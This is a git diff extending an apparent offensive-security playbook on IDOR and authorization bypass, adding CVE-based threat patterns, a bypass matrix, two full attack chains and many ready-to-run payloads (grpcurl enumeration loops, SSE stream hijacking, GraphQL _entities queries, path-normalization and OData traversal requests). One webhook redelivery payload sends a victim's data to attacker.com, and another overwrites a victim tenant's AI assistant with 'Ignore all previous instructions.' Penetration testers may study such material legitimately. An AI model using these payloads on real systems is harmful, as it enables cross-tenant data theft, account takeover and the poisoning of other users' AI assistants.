@@ -1128,7 +1128,7 @@ done
 
 ## Threat Model
 
-> Current patterns as of 2026-05-28. Update each session.
+> Current patterns as of 2026-06-01. Update each session.
 
 **What's being exploited in the wild:**
 
@@ -1239,6 +1239,55 @@ done
     (endCursor), Elasticsearch scroll, MongoDB resume_token, and any `page_token` / `after`
     / `continuation_token` parameter.
 
+19. **gRPC object-level auth gap** (NEW 2026-06) — gRPC APIs enforce service-level auth (mTLS,
+    API key, metadata token) but skip object-level ownership checks on protobuf field values.
+    gRPC-Web endpoints expose this to browser attackers. Also: CVE-2026-33186 (gRPC-Go) shows
+    RBAC interceptors can be bypassed by sending a method path without the leading slash — deny
+    rules for `/Service/Method` never match `Service/Method`, so fallback-allow fires. Always
+    test gRPC alongside REST endpoints for the same microservice.
+
+20. **SSE (Server-Sent Events) IDOR** (NEW 2026-06) — Like WebSocket IDOR but for persistent
+    HTTP event streams. The `EventSource` connection authenticates at the HTTP level; the stream
+    target (`user_id`, `channel`, `topic` query param) is trusted without ownership validation.
+    Increasingly prevalent in notification systems, live dashboards, and AI agent activity feeds
+    (CVE-2026-39889: PraisonAI SSE exposes all agent sessions system-wide with no auth).
+
+21. **GraphQL Federation authorization gaps** (NEW 2026-06) — Two confirmed bypass classes:
+    (a) Interface directive bypass (CVE-2025-64530): `@authenticated`/`@requiresScopes` placed on
+    interface types don't inherit to implementing concrete types — querying via inline fragment on
+    the concrete type bypasses the guard entirely. (b) `@requires` transitive field bypass
+    (GHSA-m8jr-fxqx-8xx6): protected fields fetched as `@requires` dependencies are resolved
+    without their own auth directive firing. Both fixed in `@apollo/composition` < 2.9.5 /
+    2.10.4 / 2.11.5 / 2.12.1.
+
+22. **URL path / request body split-trust IDOR** (NEW 2026-06) — Authorization validates the
+    object ID in the URL path parameter but uses a different ID from the request body for the
+    actual database operation without re-checking ownership. Workspace A admin supplies a valid
+    path-param ID (their scope) + a foreign body ID (victim's scope). Demonstrated in Briefer
+    (Feb 2026): cross-workspace password reset delivering plaintext credentials, and schedule
+    injection via unvalidated body `documentId`. Test any URL-scoped endpoint for diverging
+    body parameters.
+
+23. **LLM/AI API resource IDOR** (NEW 2026-06) — Multi-tenant LLM platforms (OpenAI-compatible
+    APIs, enterprise AI gateways, FastGPT, Langflow) expose threads, runs, assistants, and
+    uploaded files by predictable ID. Auth validates the API key; ownership of the thread_id /
+    assistant_id is not checked. FastGPT (GHSA-gc8m-w37w-24hw): any `appId` accessible cross-
+    tenant via `teamId` body parameter that's authenticated but not ownership-verified. Langflow
+    (CVE-2026-33484): file download endpoint requires no authentication at all.
+
+24. **Path normalization IDOR** (NEW 2026-06) — ACL middleware compares raw URL strings while
+    the router normalizes URL-encoded sequences, dot segments, or Unicode before routing.
+    Injecting `%2F..%2F`, `／..／`, null bytes, or matrix parameters (`;id=1002`) into ID fields
+    causes the ACL check to see a non-matching string while the normalized path resolves to
+    the victim's object.
+
+25. **API token IDOR with plaintext credential exposure** (NEW 2026-06) — Token deletion
+    endpoints (e.g., `DELETE /api/users/{userId}/api-tokens/{tokenId}`) validate auth but not
+    ownership, enabling revocation of any user's tokens. The response body echoes the deleted
+    token's plaintext value — converting a blind IDOR sabotage into a credential theft chain.
+    CVE-2025-64706 (Typebot). Always check DELETE responses on token management endpoints for
+    reflected credential values.
+
 ---
 
 ## Bypass Matrix
@@ -1274,6 +1323,18 @@ done
 | Next.js middleware enforces auth | Add `x-middleware-subrequest: middleware` header — skips all middleware (CVE-2025-29927, CVSS 9.1) |
 | Chatbot/AI platform "internal" API | Intercept chatbot XHR in Burp — sequential `lead_id` / `session_id` in internal endpoints → decrement to enumerate all records |
 | Opaque cursor / pagination token | Decode base64 cursor, modify `userId` / `tenantId` / `lastId`, re-encode — pagination scope not re-validated against session |
+| gRPC service-level auth, no object-level check | Substitute `user_id`/`resource_id` protobuf field value with victim's ID via grpcurl |
+| gRPC RBAC deny rule (path-based) | Remove leading slash from method path: `Service/Method` instead of `/Service/Method` — deny rules never match (CVE-2026-33186) |
+| SSE EventSource session auth | Modify `user_id` / `channel` query param in SSE connection URL after authentication |
+| GraphQL interface-level `@authenticated` | Query same field via inline fragment on implementing concrete type — directive not inherited from interface (CVE-2025-64530) |
+| GraphQL `@requiresScopes` on field | Query an unprotected field that `@requires` the protected field — dependency fetched without directive check |
+| LLM API multi-tenant isolation | Substitute `thread_id` / `asst_id` / `file_id` in OpenAI-compatible API — auth checks key, not object ownership |
+| URL path-param scoped ACL | Supply valid path-param ID (your scope) + foreign body-param ID (victim's scope) — body ID not re-validated against session |
+| Multi-auth-collection integer IDs | Submit your integer ID against another collection's endpoint — auto-increment collision causes cross-collection access |
+| SSO config update endpoint | Replace `organizationId` in request body with victim org UUID — SSO credentials replaced, enabling OAuth hijack |
+| Path-based regex ACL | Inject URL-encoded slash `%2F..%2F`, Unicode solidus `／`, or null byte `%00` into ID field — ACL regex bypassed, router normalizes path |
+| Token deletion response | Send DELETE on another user's API token — response echoes plaintext credential value (CVE-2025-64706) |
+| OData resource authorization | Use `$expand` to traverse to related entities owned by other users; use `$filter` cross-tenant to enumerate records |
 
 ---
 
@@ -1311,6 +1372,16 @@ done
 | Next.js middleware-protected routes (any path on unpatched self-hosted Next.js) | Route-level bypass | CVE-2025-29927 — all auth/RBAC bypassed with one header; CVSS 9.1 |
 | Cursor/pagination endpoints (`?cursor=`, `?after=`, `?page_token=`) | Encoded token | Full cross-user data stream access via decoded and re-encoded cursor |
 | Write-only / side-effect endpoints (unsubscribe, delete, mark-read, revoke) | Numeric / GUID | Blind IDOR: silent sabotage with no visible attacker-side data leak |
+| gRPC service endpoints (UserService/GetUser, OrderService/GetOrder) | Protobuf field (numeric/GUID) | Service-level auth only; substitute resource_id in protobuf message → cross-user data |
+| SSE event stream endpoints (`/api/events?user_id=`, `/api/stream/user/{id}/`) | Numeric / GUID | Real-time cross-user event stream via modified query param; no ownership re-check |
+| LLM API thread/assistant/file endpoints (`/v1/threads/{id}`, `/v1/assistants/{id}`, `/v1/files/{id}`) | Prefixed ID string | Conversation history, system prompts with embedded secrets, RAG documents |
+| OData entity endpoints (`/api/odata/Orders({id})?$expand=`, `/api/$metadata`) | Numeric / GUID | Relationship traversal to credit cards, invoices, HR data via $expand chain |
+| Webhook event delivery logs (`/api/webhooks/deliveries/{event_id}`, `/api/hooks/{id}/deliveries/{id}`) | Numeric / UUID | Cross-tenant webhook payloads containing PII, payment data, embedded API keys |
+| SSO/OAuth configuration endpoints (`PUT /api/loginmethod`, `PUT /api/saml/config`) | UUID (organizationId) | Replace victim org's OAuth credentials → redirect their login flow → ATO chain |
+| GraphQL federated subgraph `_entities` endpoints (`/api/*-subgraph/graphql`) | Entity representation | Cross-service entity resolution without gateway auth; any entity type across the graph |
+| Token management endpoints (`DELETE /api/users/{id}/api-tokens/{id}`) | Integer / UUID | Delete victim's tokens + receive plaintext credential in response (CVE-2025-64706) |
+| Multi-auth-collection preferences/settings (platforms with multiple user types) | Sequential integer | Cross-collection ID collision: admin id=5 accesses customer id=5's data |
+| Any endpoint with `organizationId`/`workspaceId`/`tenantId` in request BODY (not URL) | UUID | Split-trust: URL param validated, body param unchecked → cross-org action |
 
 ---
 
@@ -1532,6 +1603,90 @@ Impact: Critical — full authentication + authorization bypass on any unpatched
 self-hosted Next.js (< 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3)
 Note: Vercel-hosted apps are auto-patched; self-hosted Docker/Node deployments are primary targets
 CVE: CVE-2025-29927, CVSS 9.1
+```
+
+### Chain 10: SSO Configuration IDOR → OAuth Credential Hijack → Full Org ATO
+
+```
+1. Register as a free-tier user on a multi-tenant SaaS platform that supports SSO
+
+2. Enumerate target organization UUIDs:
+   - Found in public URLs (e.g., /org/{uuid}/dashboard, Wayback Machine)
+   - Leaked in error messages, email links, or invite tokens
+   - Some platforms expose org UUIDs via unauthenticated endpoints
+
+3. Intercept the SSO configuration update request from your own org in Burp:
+   PUT /api/v1/loginmethod HTTP/1.1
+   Authorization: Bearer <your-jwt>
+   {"organizationId": "YOUR_ORG_UUID", "providers": [{"providerName": "google",
+     "config": {"clientID": "your-client", "clientSecret": "your-secret"}, "status": "enable"}]}
+
+4. Replay with victim org UUID in the body (auth still passes — your JWT is valid):
+   PUT /api/v1/loginmethod HTTP/1.1
+   Authorization: Bearer <your-jwt>
+   {"organizationId": "VICTIM_ORG_UUID",
+    "providers": [{"providerName": "google",
+      "config": {"clientID": "ATTACKER_OAUTH_CLIENT", "clientSecret": "ATTACKER_SECRET"},
+      "status": "enable"}]}
+   → 200 OK — victim org's SSO config replaced with attacker's OAuth credentials
+
+5. Wait for any user from victim org to click "Login with Google"
+   → Their browser redirects to Google OAuth with attacker's client_id
+   → Google sends authorization code to attacker's redirect_uri
+   → Attacker exchanges code for Google access token
+
+6. Use access token to access victim user's account on the SaaS platform
+   → Full ATO on any victim org employee who uses SSO login
+
+Impact: Critical — one API call compromises entire organization's SSO
+         Affects all SSO-enabled users in the victim org simultaneously
+CVE pattern: CVE-2026-30823 (Flowise) — CVSS 8.8
+```
+
+### Chain 11: GraphQL Federation Interface Bypass + @requires Transitive Leak → Admin PII Exfil
+
+```
+1. Discover a federated GraphQL API:
+   - Response header: apollographql-federation-version: 2.x
+   - Schema has types with @key directive (Apollo Federation entities)
+
+2. Enumerate interfaces and their implementing types via introspection:
+   query { __schema { types { name kind interfaces { name } fields { name } } } }
+   → Discover: interface "Node" has field "sensitiveData" marked @authenticated
+   → Concrete type "AdminUser" implements "Node"
+
+3. Chain A — Interface Directive Bypass (CVE-2025-64530):
+   query BypassAuth {
+     node(id: "admin_user_abc") {
+       ... on AdminUser {   ← concrete type, @authenticated not enforced here
+         id
+         email
+         role
+         internalNotes
+         salaryBand
+       }
+     }
+   }
+   → 200 OK — sensitive data returned despite @authenticated on interface
+
+4. Chain B — @requires Transitive Bypass (GHSA-m8jr-fxqx-8xx6):
+   # Schema: internalCostPrice @authenticated, discountedPrice @requires(internalCostPrice)
+   query TransitiveBypass {
+     product(id: "prod_123") {
+       discountedPrice   ← fetches internalCostPrice as dependency, no auth check
+     }
+   }
+   → 200 OK — protected cost data resolved transitively without auth check
+
+5. Combine with _entities direct subgraph access (bypass gateway entirely):
+   POST /api/users-subgraph HTTP/1.1   ← subgraph endpoint, no gateway auth
+   {"query": "query($r:[_Any!]!) { _entities(representations:$r) { ...on AdminUser { id email role internalNotes } } }",
+    "variables": {"representations": [{"__typename":"AdminUser","id":"1"},{"__typename":"AdminUser","id":"2"}]}}
+   → Returns all admin profiles without going through gateway authorization
+
+Impact: Critical — complete bypass of GraphQL field-level authorization;
+         all @authenticated/@requiresScopes guards silently ineffective
+Affected: @apollo/composition < 2.9.5 / 2.10.4 / 2.11.5 / 2.12.1
 ```
 
 ---
@@ -1814,3 +1969,690 @@ GET /api/search/scroll HTTP/1.1
 → Continues victim's search session, returns their scoped results
 ```
 **Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## gRPC / Protobuf IDOR
+**Reference type:** Numeric / GUID (protobuf field)
+**API pattern:** gRPC (unary, server-streaming, bidirectional), gRPC-Web
+**Authorization flaw:** Service-level authorization (mTLS, API key, metadata header token) validates the caller identity but not ownership of the `resource_id` / `user_id` field in the protobuf request message. Object-level check is present on the REST API but never ported to the gRPC service implementation.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Access to any user's data by substituting field values in protobuf-encoded messages. Most prevalent in internal microservice APIs exposed via gRPC-Web gateway to browsers, and in mobile app backends using gRPC.
+**Test payload:**
+```bash
+# Install grpcurl: brew install grpcurl
+# or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+
+# Step 1: Discover services and methods (requires server reflection, or supply .proto files)
+grpcurl -insecure target.com:443 list
+grpcurl -insecure target.com:443 list myapp.UserService
+grpcurl -insecure target.com:443 describe myapp.UserService
+
+# Step 2: Describe the request message schema:
+grpcurl -insecure target.com:443 describe myapp.GetUserRequest
+# → user_id (field 1, string), include_billing (field 2, bool)
+
+# Step 3: Call with your own ID (normal flow):
+grpcurl -insecure -H "Authorization: Bearer <your-token>" \
+  -d '{"user_id": "1001"}' \
+  target.com:443 myapp.UserService/GetUser
+
+# Step 4: Substitute victim's user_id — IDOR test:
+grpcurl -insecure -H "Authorization: Bearer <your-token>" \
+  -d '{"user_id": "1002"}' \
+  target.com:443 myapp.UserService/GetUser
+# → Returns victim's data → gRPC IDOR confirmed
+
+# Step 5: Enumerate a range:
+for i in $(seq 1000 1100); do
+  grpcurl -insecure -H "Authorization: Bearer <your-token>" \
+    -d "{\"user_id\": \"$i\"}" \
+    target.com:443 myapp.UserService/GetUser 2>&1 \
+    | grep -i '"email"\|"phone"\|"name"' && echo "HIT: $i"
+done
+
+# gRPC-Web (browser-accessible): interceptable in Burp Suite with grpc-web decoder extension
+# gRPC-Web requests: POST /package.Service/Method, Content-Type: application/grpc-web+proto
+# Burp plugin decodes protobuf binary; modify field values and re-encode
+
+# gRPC server-streaming IDOR (auth at connection, no per-message ownership check):
+grpcurl -insecure -H "Authorization: Bearer <your-token>" \
+  -d '{"channel_id": "ch_victim_9002"}' \
+  target.com:443 myapp.NotificationService/Subscribe
+# → Streams victim's real-time notifications until connection closes
+
+# Discovery: look for .proto files in mobile APK/IPA (jadx, apktool),
+# JS bundles (gRPC-Web codegen), or Swagger with gRPC-gateway annotations
+```
+**Source:** https://github.com/fullstorydev/grpcurl; https://owasp.org/www-project-api-security/
+
+---
+
+## Server-Sent Events (SSE) IDOR
+**Reference type:** Numeric ID / GUID / username (query parameter or path segment)
+**API pattern:** REST (SSE / EventSource over HTTP)
+**Authorization flaw:** SSE endpoints authenticate the initial HTTP connection via session cookie or token but use a `user_id`, `channel`, or `topic` query parameter to determine which events to stream. No ownership check verifies that the requested stream identifier matches the session. Developers assume only the correct client will supply their own ID, but the parameter is fully attacker-controlled.
+**Escalation:** Horizontal
+**Business impact:** Real-time exfiltration of another user's private event stream — security alerts, trade notifications, health readings, financial transactions, chat messages — using only a valid session cookie and a modified query parameter.
+**Test payload:**
+```http
+# Detection: grep client JS for EventSource() calls with user_id/channel params
+# Burp: filter HTTP history by Accept: text/event-stream
+
+# Normal SSE connection — your own stream:
+GET /api/events?user_id=1001 HTTP/1.1
+Host: target.com
+Accept: text/event-stream
+Cache-Control: no-cache
+Cookie: session=<your-session>
+
+# IDOR bypass — subscribe to victim's stream:
+GET /api/events?user_id=1002 HTTP/1.1
+Host: target.com
+Accept: text/event-stream
+Cache-Control: no-cache
+Cookie: session=<your-session>
+# → Server begins streaming victim's events → IDOR confirmed
+
+# Confirmed when you receive victim's data in the SSE stream:
+data: {"type":"security_alert","userId":1002,"message":"New login from IP 203.0.113.5"}
+data: {"type":"transaction","userId":1002,"amount":-5000,"merchant":"WIRE TRANSFER"}
+
+# Path-based and topic-based patterns (also test):
+GET /api/stream/user/1002/notifications HTTP/1.1
+GET /api/sse?topic=user.1002.alerts HTTP/1.1
+GET /api/events/org/victim-org/feed HTTP/1.1
+GET /api/live?channel=notifications&uid=1002 HTTP/1.1
+
+# Enumerate UIDs via parallel connections (Node.js):
+# for (let uid = 1000; uid <= 1100; uid++) {
+#   const es = new EventSource(`/api/events?user_id=${uid}`);
+#   es.onmessage = e => { if (e.data !== "{}") console.log(`UID ${uid}:`, e.data); }
+# }
+
+# Burp workaround: SSE connections stay open; use Burp Repeater
+# and watch the streaming response body for continuous event data
+```
+**Source:** https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events
+
+---
+
+## GraphQL Federation Entity Resolver IDOR
+**Reference type:** GUID / Numeric
+**API pattern:** GraphQL (Apollo Federation / federated subgraphs)
+**Authorization flaw:** In Apollo Federation, the gateway validates caller identity but individual subgraph entity resolvers (`__resolveReference`) are designed to trust incoming entity representations from the gateway — they skip ownership checks, assuming the gateway enforces them. If subgraph endpoints are publicly reachable, an attacker can send `_entities` queries directly with arbitrary entity representations, bypassing gateway-level authorization and resolving any user's data.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Cross-service data access across the entire federated schema — user profiles, payment methods, orders, admin entities — from individual subgraphs without per-entity ownership validation. A single subgraph endpoint exposure compromises all entity types it serves.
+**Test payload:**
+```http
+# Identify federated GraphQL endpoints:
+# - Response header: apollographql-federation-version: 2.x
+# - URL paths: /graphql/subgraph, /api/users-subgraph, /api/orders-subgraph
+# - Introspection returns _entities query and _Any scalar type
+
+# Step 1: Discover entity types via gateway introspection:
+POST /graphql HTTP/1.1
+{"query": "{ __schema { types { name fields { name } } } }"}
+# Look for types with id fields that appear across services
+
+# Step 2: Direct _entities query to a subgraph endpoint — resolves foreign entities:
+POST /api/users-subgraph HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer <your-token>
+
+{
+  "query": "query($r: [_Any!]!) { _entities(representations: $r) { ... on User { id email role creditCard { last4 } } } }",
+  "variables": {
+    "representations": [
+      {"__typename": "User", "id": "1002"},
+      {"__typename": "User", "id": "1003"},
+      {"__typename": "User", "id": "1004"}
+    ]
+  }
+}
+# → Returns users 1002-1004 data resolved from subgraph → IDOR confirmed
+
+# Batch enumerate 100 users in one request:
+# "representations": [{"__typename":"User","id":"1"},{"__typename":"User","id":"2"},...]
+
+# Step 3: Cross-service IDOR — orders subgraph resolves Order entities without ownership:
+POST /api/orders-subgraph HTTP/1.1
+{
+  "query": "query($r: [_Any!]!) { _entities(representations: $r) { ... on Order { id total shippingAddress paymentMethod { last4 } } } }",
+  "variables": { "representations": [{"__typename": "Order", "id": "ORD-9982"}] }
+}
+
+# Discovery:
+# rover subgraph introspect http://target.com/api/users-subgraph
+# Check: /api/*-subgraph, /graphql/*, /api/v1/internal/graphql
+# Look for X-Apollo-Federation or apollographql- headers in responses
+```
+**Source:** https://www.apollographql.com/docs/federation/; https://escape.tech/blog/idor-in-graphql/
+
+---
+
+## IDOR in LLM / AI API Resources
+**Reference type:** Prefixed ID string (`thread_`, `run_`, `asst_`, `file_`, `msg_`)
+**API pattern:** REST (OpenAI-compatible API, multi-tenant LLM platform)
+**Authorization flaw:** OpenAI-style LLM APIs expose endpoints for assistants, threads, messages, runs, and uploaded files. Multi-tenant deployments (enterprise LLM gateways, internal AI platforms) authenticate via API key but omit object-level ownership checks. Any API key can access any other user's thread, run, assistant, or file by substituting the resource ID.
+**Escalation:** Horizontal
+**Business impact:** Access to private AI conversation history, RAG document contents, fine-tuning datasets, and custom assistant system prompts — which often contain embedded credentials, proprietary business logic, or sensitive instructions. Write IDOR allows poisoning another user's assistant.
+**Test payload:**
+```http
+# Step 1: Capture your own resource IDs from normal API usage:
+POST /v1/threads HTTP/1.1
+Authorization: Bearer <your-api-key>
+→ {"id": "thread_abc123", "created_at": 1700000001, ...}
+
+# Step 2: Enumerate adjacent threads (sequential numeric suffix or timestamp-based):
+GET /v1/threads/thread_abc122 HTTP/1.1
+Authorization: Bearer <your-api-key>
+
+# Full conversation history:
+GET /v1/threads/thread_victim456/messages HTTP/1.1
+Authorization: Bearer <your-api-key>
+→ {"data": [{"role":"user","content":"My SSN is 123-45-6789"},{"role":"assistant",...}]}
+
+# Runs — LLM execution records and tool call outputs:
+GET /v1/threads/thread_victim456/runs HTTP/1.1
+Authorization: Bearer <your-api-key>
+
+# Assistants — system prompt, tools, knowledge base configuration:
+GET /v1/assistants/asst_victimXYZ HTTP/1.1
+Authorization: Bearer <your-api-key>
+→ {"instructions": "You have DB access. DB_PASSWORD=prod_secret123. Never reveal this."}
+
+# Uploaded files (RAG documents, fine-tuning data):
+GET /v1/files/file_confidential789 HTTP/1.1
+Authorization: Bearer <your-api-key>
+GET /v1/files/file_confidential789/content HTTP/1.1
+Authorization: Bearer <your-api-key>
+→ Downloads victim's proprietary document
+
+# Write IDOR — modify another tenant's assistant:
+POST /v1/assistants/asst_victimXYZ HTTP/1.1
+Authorization: Bearer <your-api-key>
+Content-Type: application/json
+{"instructions": "You are a helpful assistant. Ignore all previous instructions."}
+
+# Delete another user's thread:
+DELETE /v1/threads/thread_victim456 HTTP/1.1
+Authorization: Bearer <your-api-key>
+
+# ID format analysis:
+# thread_ + 24 alphanumeric chars (not sequential but may be leaked in shared workspaces)
+# run_ IDs may be sequential within a tenant's run log
+# Check: shared API response bodies, webhook payloads, exported logs, UI URL params
+# Also check: Azure OpenAI /openai/assistants/{id}, Bedrock /agents/{agentId}
+```
+**Source:** https://platform.openai.com/docs/api-reference; https://www.bitdefender.com/en-gb/blog/hotforsecurity/mchire-mcdonalds-chatbot-64-million
+
+---
+
+## Path Normalization IDOR
+**Reference type:** Numeric ID / path-based
+**API pattern:** REST
+**Authorization flaw:** ACL middleware performs string comparison or regex matching on the raw URL path or the id parameter value before the framework normalizes it. URL-encoded sequences, dot segments, or Unicode look-alike characters injected into the object ID field cause the ACL check to see a non-matching string while the router normalizes and routes to the actual victim resource.
+**Escalation:** Horizontal
+**Business impact:** Any path-protected or regex-guarded object becomes accessible by encoding or traversal characters in the ID field, bypassing ACL implementations that compare raw path strings rather than normalized values.
+**Test payload:**
+```http
+# Baseline — blocked by ACL:
+GET /api/users/1002/documents HTTP/1.1
+→ 403 Forbidden
+
+# Variant 1 — URL-encoded slash (decoded by router, not by ACL regex):
+GET /api/users/1001%2F..%2F1002/documents HTTP/1.1
+# ACL sees: path contains "1001%2F..%2F1002" (no match for "1002")
+# Router normalizes to: /api/users/1002/documents
+
+# Variant 2 — double-encoded slash:
+GET /api/users/1001%252F..%252F1002/documents HTTP/1.1
+
+# Variant 3 — dot-segment injection:
+GET /api/users/1001/../1002/documents HTTP/1.1
+GET /api/users/./1002/documents HTTP/1.1
+
+# Variant 4 — Unicode fullwidth solidus U+FF0F (normalized to /):
+GET /api/users/1001／..／1002/documents HTTP/1.1
+
+# Variant 5 — trailing slash or double-slash (common ACL regex mismatch):
+GET /api/users/1002/ HTTP/1.1          ← ACL checks /users/1002 (no slash)
+GET /api/users//1002 HTTP/1.1          ← double-slash normalization
+GET /api/users/1002%20 HTTP/1.1        ← trailing space stripped by framework
+
+# Variant 6 — null byte truncation (C-based or PHP backends):
+GET /api/users/1001%00/documents HTTP/1.1
+# ACL matches "1001\0" against "1001"; backend strips null byte
+
+# Variant 7 — matrix URI parameters (Tomcat, Spring):
+GET /api/users;id=1002/documents HTTP/1.1
+# Some frameworks strip matrix params before routing, ACL sees only /api/users/
+
+# Also test in query string path parameters:
+GET /api/files?path=user_1001%2F..%2Fuser_1002%2Fprivate.pdf HTTP/1.1
+GET /api/documents?id=..%2F..%2Fadmin%2Fconfigs HTTP/1.1
+
+# Automation: Burp Intruder with "Fuzzing - path traversal" payload list
+# Burp extension "Bypass 403" / "403 Bypasser" auto-tests encoding variants
+```
+**Source:** https://portswigger.net/web-security/file-path-traversal; https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/
+
+---
+
+## IDOR in Webhook Event Replay / Delivery Logs
+**Reference type:** Numeric / UUID (`event_id`, `delivery_id`, `hook_event_id`)
+**API pattern:** REST
+**Authorization flaw:** Webhook delivery log and event replay endpoints authenticate the caller but don't validate that the requested `event_id` belongs to the caller's account. Sequential or predictable event IDs enable cross-tenant access. The replay action escalates this to active exploitation by re-sending another org's webhook payload to an attacker-controlled endpoint.
+**Escalation:** Horizontal / Tenant isolation
+**Business impact:** Access to other organizations' webhook payloads — containing payment data, full PII, embedded API secrets, order records, and business-sensitive trigger conditions. Replay IDOR allows triggering duplicate processing on victim systems or intercepting sensitive payload data.
+**Test payload:**
+```http
+# Step 1: Observe your own event ID from the webhook delivery log:
+GET /api/webhooks/deliveries HTTP/1.1
+Authorization: Bearer <your-token>
+→ {"deliveries": [{"id": "evt_8821", "status": "delivered", "payload": {...}}]}
+
+# Step 2: Access an adjacent event ID belonging to another tenant:
+GET /api/webhooks/deliveries/evt_8820 HTTP/1.1
+Authorization: Bearer <your-token>
+→ If returns another org's payload → cross-tenant IDOR confirmed:
+  {"event_type": "payment.completed", "customer_email": "victim@corp.com",
+   "card_last4": "4242", "amount": 9990, "api_key_used": "sk_live_..."}
+
+# Step 3: Replay another org's event (active IDOR — triggers duplicate processing):
+POST /api/webhooks/deliveries/evt_8820/redeliver HTTP/1.1
+Authorization: Bearer <your-token>
+
+# Also test with configurable endpoint:
+POST /api/webhooks/deliveries/evt_8820/redeliver HTTP/1.1
+{"endpoint_url": "https://attacker.com/capture"}
+→ Receives victim's full webhook payload on attacker's server
+
+# Common endpoint patterns:
+GET /api/webhooks/events/{event_id}
+GET /api/integrations/{id}/deliveries/{delivery_id}
+GET /api/hooks/{hook_id}/deliveries/{delivery_id}
+POST /api/events/{event_id}/retry
+GET /api/webhook_logs/{id}
+
+# Numeric suffix enumeration: evt_8800 → evt_9000 (200 requests covers typical window)
+# Burp Intruder: extract numeric suffix, sweep range with filter on "payload" in response
+
+# Signs of a vulnerable webhook system:
+# - Integer delivery IDs visible in the UI (Zapier-style platforms)
+# - "Redeliver" or "Retry" button in webhook management UI
+# - Multi-tenant SaaS where all orgs share the same webhook event table
+```
+**Source:** https://docs.github.com/en/rest/repos/webhooks; https://hackerone.com/reports/1531958
+
+---
+
+## OData $expand / $filter Traversal IDOR
+**Reference type:** Numeric ID / GUID (in OData query expressions)
+**API pattern:** REST (OData v3 / v4 protocol)
+**Authorization flaw:** OData `$expand` traverses relationship links to return related entities inline. Authorization middleware validates access to the primary entity but doesn't re-validate ownership of the expanded related entities. `$filter` applied to a collection endpoint without session-scoping returns records across all users matching the attacker-controlled predicate.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Relationship graph traversal to any linked entity — financials, HR, customer PII, payment methods — from any starting object. `$filter` cross-tenant enumeration exposes arbitrary records. Most prevalent in Microsoft Dynamics 365, SAP Fiori, Salesforce OData, SharePoint REST API, and custom enterprise APIs.
+**Test payload:**
+```http
+# Identify OData APIs:
+# - URL pattern: /api/odata/, /api/$metadata, /odata/v4/, /data/
+# - Response header: OData-Version: 4.0
+# - Fetch schema: GET /api/$metadata → XML with all entities and relationships
+
+# Baseline: access your own order with relationship expansion:
+GET /api/odata/Orders(9001)?$expand=Customer,Invoice,LineItems HTTP/1.1
+Authorization: Bearer <your-token>
+→ Returns your order with nested customer, invoice, line item entities
+
+# IDOR: substitute another user's primary entity ID:
+GET /api/odata/Orders(9002)?$expand=Customer($select=email,creditCard),Invoice HTTP/1.1
+Authorization: Bearer <your-token>
+→ Returns victim's order + credit card via expanded Customer → IDOR confirmed
+
+# Deep navigation chain (multi-hop $expand):
+GET /api/odata/Users(1002)/Orders?$expand=Invoice($expand=PaymentMethod) HTTP/1.1
+Authorization: Bearer <your-token>
+# → User → Orders → Invoices → PaymentMethods (multi-level traversal)
+
+# Cross-tenant $filter enumeration (no session scoping on collection):
+GET /api/odata/Customers?$filter=CompanyName eq 'AcmeCorp'&$select=id,email,revenue HTTP/1.1
+GET /api/odata/Employees?$filter=salary gt 100000&$select=name,salary,ssn HTTP/1.1
+GET /api/odata/Orders?$filter=CustomerId ne 9001&$top=100 HTTP/1.1
+
+# Sensitive field extraction via $select on another user's object:
+GET /api/odata/Employees(1002)?$select=salary,bankAccount,ssn,performanceRating HTTP/1.1
+Authorization: Bearer <your-token>
+
+# OData batch request — mix authorized and unauthorized entity access:
+POST /api/odata/$batch HTTP/1.1
+Content-Type: multipart/mixed; boundary=batch_boundary
+
+--batch_boundary
+Content-Type: application/http
+
+GET Orders(9001) HTTP/1.1
+
+--batch_boundary
+Content-Type: application/http
+
+GET Orders(9002) HTTP/1.1
+
+--batch_boundary--
+
+# $filter range enumeration:
+GET /api/odata/Documents?$filter=id gt 5000 and id lt 5100&$select=id,content,owner HTTP/1.1
+
+# Targeted cross-tenant search:
+GET /api/odata/Users?$filter=email eq 'victim@corp.com'&$expand=PaymentMethods HTTP/1.1
+```
+**Source:** https://www.odata.org/getting-started/; https://docs.microsoft.com/en-us/azure/data-explorer/kusto/api/rest/odata
+
+---
+
+## URL Path / Request Body ID Split-Trust IDOR
+**Reference type:** UUID (diverging between URL path and request body)
+**API pattern:** REST
+**Authorization flaw:** The server validates ownership of the object ID in the URL path parameter (`:workspaceId`, `:documentId`) against the session, but then uses a **different** ID from the request body for the actual database operation without re-checking ownership. The caller is authorized for the path-param object but performs the action on the body-param object. This split-trust pattern is pervasive in workspace-scoped admin APIs where developers forgot to validate the body ID against the session scope.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Admin of Organization A can perform privileged actions (password reset, content export, schedule creation) on objects belonging to Organization B by supplying a valid path ID (their own scope) with a foreign body ID (victim's scope). Demonstrated in Briefer (Feb 2026): workspace admins reset passwords of any global user, receiving plaintext credentials in the response.
+**Test payload:**
+```http
+# Pattern: URL path ID is validated, body ID is not re-validated against session scope
+
+# Example 1 — Cross-workspace password reset (Briefer pattern):
+POST /workspaces/YOUR_WORKSPACE_UUID/users/VICTIM_USER_UUID/reset-password HTTP/1.1
+Host: target.com
+Cookie: <your-admin-session>
+# URL workspace UUID matches your session → auth passes
+# Victim user UUID is in a different workspace → ownership not checked
+→ Response includes plaintext new password for victim
+
+# Example 2 — Cross-workspace schedule injection (body param not validated):
+POST /workspaces/YOUR_WORKSPACE_UUID/documents/YOUR_DOC_UUID/schedules HTTP/1.1
+Cookie: <your-admin-session>
+Content-Type: application/json
+{
+  "scheduleParams": {
+    "documentId": "VICTIM_DOC_UUID"   ← body param overrides path param, not validated
+  }
+}
+→ Scheduled execution runs against victim's document
+
+# General testing procedure:
+# 1. Find any URL-path-scoped endpoint: /api/orgs/{orgId}/resources/{resourceId}/action
+# 2. Use your own org's valid {orgId} in the URL
+# 3. Substitute a foreign {resourceId} or add a foreign ID in the request body
+# 4. Observe whether the action affects the foreign resource despite your session scope
+
